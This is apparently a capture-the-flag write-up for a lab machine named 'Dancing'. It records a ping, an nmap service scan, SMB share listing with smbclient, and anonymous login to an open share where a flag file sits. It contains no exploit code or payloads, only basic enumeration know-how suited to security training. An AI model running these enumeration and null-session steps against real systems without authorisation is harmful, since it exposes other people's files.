# Dancing

---

## 10.129.56.234

---

## ping 10.129.56.234

```
PING 10.129.56.234 (10.129.56.234) 56(84) bytes of data.
64 bytes from 10.129.56.234: icmp_seq=1 ttl=127 time=149 ms
64 bytes from 10.129.56.234: icmp_seq=2 ttl=127 time=231 ms
^C
--- 10.129.56.234 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss
```

---

## sudo nmap -sV 10.129.56.234 -oX ./nmap/initial

```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

## smbclient -L 10.129.56.234

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
```

---

## smbclient \\\\10.129.56.234\\WorkShares

Password field can be left empty. And we have access to:

```
smb: \> ls
  .                                   D        0  Mon Mar 29 11:22:01 2021
  ..                                  D        0  Mon Mar 29 11:22:01 2021
  Amy.J                               D        0  Mon Mar 29 12:08:24 2021
  James.P                             D        0  Thu Jun  3 11:38:03 2021
```

In `Amy.J` we can find `worknotes.txt` and in `James.P` we can find `flag.txt`. And we are done.
